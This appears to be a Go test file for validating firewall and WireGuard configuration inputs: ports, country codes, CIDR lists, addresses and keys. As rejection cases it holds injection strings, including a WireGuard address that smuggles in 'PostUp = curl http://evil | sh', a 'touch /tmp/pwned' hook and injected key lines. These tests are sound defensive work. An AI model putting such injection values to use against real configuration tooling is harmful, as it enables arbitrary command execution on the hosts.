package config

import (
	"strings"
	"testing"
)

func TestValidateInputAllowDport(t *testing.T) {
	good := []string{"22", "1024-65535", "{ 80, 443 }", "{80,443}", "{ 19132-19133 }"}
	for _, d := range good {
		if err := ValidateInputAllowDport(d); err != nil {
			t.Fatalf("%q: %v", d, err)
		}
	}
	bad := []string{"", "22;", "22 accept", "{ 80, 443", "80}", "0", "65536", "1-65536-3", "80\n443"}
	for _, d := range bad {
		if err := ValidateInputAllowDport(d); err == nil {
			t.Fatalf("expected error for %q", d)
		}
	}
}

func TestValidateRejectsBadIface(t *testing.T) {
	c := sampleBase()
	c.WireGuard.Interface = "evil iface"
	if err := c.Validate(); err == nil {
		t.Fatal("expected iface error")
	}
}

func TestValidateRejectsBadPeerName(t *testing.T) {
	c := sampleBase()
	c.Peers = []Peer{{Name: "a\nb", PublicKey: "k", TunnelIP: "10.100.0.2/32"}}
	if err := c.Validate(); err == nil {
		t.Fatal("expected peer name error")
	}
}

func TestValidateRejectsBadGeoCountry(t *testing.T) {
	c := sampleBase()
	c.Geo = Geo{Enabled: true, Mode: "allow", SetName: "geo_v4", Countries: []string{"nor"}, ZoneDir: "/z"}
	if err := c.Validate(); err == nil {
		t.Fatal("expected geo country error")
	}
}

func TestValidateCountryCode(t *testing.T) {
	for _, cc := range []string{"no", "se", "US", " de "} {
		if err := ValidateCountryCode(cc); err != nil {
			t.Errorf("ValidateCountryCode(%q) = %v, want nil", cc, err)
		}
	}
	for _, cc := range []string{"", "n", "nor", "n0", "!!", "u-s", "😀😀"} {
		if err := ValidateCountryCode(cc); err == nil {
			t.Errorf("ValidateCountryCode(%q) = nil, want error", cc)
		}
	}
}

func TestValidateSourceDenyCIDRs(t *testing.T) {
	valid := [][]string{
		nil,
		{},
		{"192.0.2.0/24"},
		{"192.0.2.7"},
		{" 192.0.2.0/24 ", "198.51.100.1"},
	}
	for _, cidrs := range valid {
		if err := ValidateSourceDenyCIDRs(0, cidrs); err != nil {
			t.Errorf("ValidateSourceDenyCIDRs(%v) = %v, want nil", cidrs, err)
		}
	}
	invalid := [][]string{
		{""},
		{"not-an-ip"},
		{"192.0.2.0/33"},
		{"2001:db8::/32"}, // IPv6 rejected: sets are v4-only
		{"2001:db8::1"},
		{"192.0.2.0/24; drop"},
	}
	for _, cidrs := range invalid {
		if err := ValidateSourceDenyCIDRs(0, cidrs); err == nil {
			t.Errorf("ValidateSourceDenyCIDRs(%v) = nil, want error", cidrs)
		}
	}

	// Error messages carry the route index (or the global prefix for -1).
	if err := ValidateSourceDenyCIDRs(3, []string{"bad"}); err == nil || !strings.Contains(err.Error(), "routes[3]") {
		t.Errorf("want routes[3] in error, got %v", err)
	}
	if err := ValidateSourceDenyCIDRs(-1, []string{"bad"}); err == nil || strings.Contains(err.Error(), "routes[") {
		t.Errorf("want global error without route index, got %v", err)
	}

	// Entry cap.
	many := make([]string, MaxSourceAllowCIDRs+1)
	for i := range many {
		many[i] = "192.0.2.1"
	}
	if err := ValidateSourceDenyCIDRs(0, many); err == nil {
		t.Error("want error for too many entries")
	}
}

func TestValidateBreakGlassCIDRs(t *testing.T) {
	for _, cidrs := range [][]string{nil, {}, {"203.0.113.0/24"}, {"203.0.113.9"}} {
		if err := ValidateBreakGlassCIDRs(cidrs); err != nil {
			t.Errorf("ValidateBreakGlassCIDRs(%v) = %v, want nil", cidrs, err)
		}
	}
	for _, cidrs := range [][]string{{""}, {"junk"}, {"203.0.113.0/99"}, {"2001:db8::/32"}} {
		if err := ValidateBreakGlassCIDRs(cidrs); err == nil {
			t.Errorf("ValidateBreakGlassCIDRs(%v) = nil, want error", cidrs)
		}
	}
	many := make([]string, MaxSourceAllowCIDRs+1)
	for i := range many {
		many[i] = "203.0.113.1"
	}
	if err := ValidateBreakGlassCIDRs(many); err == nil {
		t.Error("want error for too many entries")
	}
}

func TestValidateWireGuardAddress(t *testing.T) {
	good := []string{"10.100.0.1/24", "10.100.0.1", "10.0.0.1/32, fd00::1/64", "fd00::1"}
	for _, a := range good {
		if err := ValidateWireGuardAddress(a); err != nil {
			t.Fatalf("%q: unexpected error: %v", a, err)
		}
	}
	bad := []string{
		"",
		"not-an-ip",
		"10.0.0.0/33",
		"10.100.0.1/24\nPostUp = curl http://evil | sh", // injection attempt
		"10.100.0.1/24,", // empty entry
		"10.100.0.1\x00", // NUL control char
	}
	for _, a := range bad {
		if err := ValidateWireGuardAddress(a); err == nil {
			t.Fatalf("expected error for %q", a)
		}
	}
}

func TestValidateWireGuardAddressInjectionRejectedByConfig(t *testing.T) {
	c := sampleBase()
	c.WireGuard.Address = "10.100.0.1/24\nPostUp = touch /tmp/pwned"
	if err := c.Validate(); err == nil {
		t.Fatal("expected Validate to reject newline injection in wireguard.address")
	}
}

func TestValidateWireGuardKey(t *testing.T) {
	good := []string{
		"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=",
		"abcABC0123456789+/abcABC0123456789+/abcABC0=",
	}
	for _, k := range good {
		if err := ValidateWireGuardKey(k); err != nil {
			t.Fatalf("%q: unexpected error: %v", k, err)
		}
	}
	bad := []string{
		"",
		"k",
		"tooshort=",
		"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA",                  // no trailing =
		"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=\nPublicKey = evil", // injection
	}
	for _, k := range bad {
		if err := ValidateWireGuardKey(k); err == nil {
			t.Fatalf("expected error for %q", k)
		}
	}
}

func TestValidatePeerKeyInjectionRejectedByConfig(t *testing.T) {
	c := sampleBase()
	c.Peers = []Peer{{Name: "a", PublicKey: "AAAA=\nPresharedKey = x", TunnelIP: "10.100.0.2/32"}}
	if err := c.Validate(); err == nil {
		t.Fatal("expected Validate to reject malformed peer public_key")
	}
}
